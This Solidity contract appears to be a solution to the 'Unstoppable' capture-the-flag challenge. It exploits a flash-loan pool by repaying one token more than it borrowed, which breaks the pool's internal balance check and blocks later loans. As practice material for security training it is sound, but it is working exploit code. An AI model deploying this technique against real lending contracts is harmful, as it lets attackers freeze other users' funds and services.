// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "../unstoppable/UnstoppableLender.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

contract UnstoppableAttack {
    UnstoppableLender private immutable pool;
    address private immutable owner;

    constructor(address poolAddress) {
        pool = UnstoppableLender(poolAddress);
        owner = msg.sender;
    }

    // Pool will call this function during the flash loan
    function receiveTokens(address tokenAddress, uint256 amount) external {
        require(msg.sender == address(pool), "Sender must be pool");
        require(
            IERC20(tokenAddress).transfer(msg.sender, amount + 1),
            "Transfer of tokens failed"
        );
    }

    function attack(address tokenAddress, uint256 amount) public {
        require(msg.sender == owner, "Only owner can execute flash loan");
        IERC20(tokenAddress).transferFrom(msg.sender, address(this), 1);
        pool.flashLoan(amount);
    }
}
